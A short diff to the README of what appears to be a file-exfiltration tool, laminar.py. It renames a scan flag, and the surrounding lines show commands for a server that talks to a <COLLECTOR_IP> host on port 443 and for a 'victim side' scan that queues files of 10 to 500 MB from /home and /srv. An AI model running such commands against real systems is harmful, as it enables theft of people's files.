@@ -49,7 +49,7 @@ python3 laminar.py --mode server --remote-host <COLLECTOR_IP> --remote-port 443
 ### 3. Scan and Queue Files (Victim side)
 
 ```bash
-python3 laminar.py --mode scan --roots /home /srv --min-mb 10 --max-mb 500
+python3 laminar.py --mode scan --dirs /home /srv --min-mb 10 --max-mb 500
 ```
 
 It is possible to scan a specific file: 
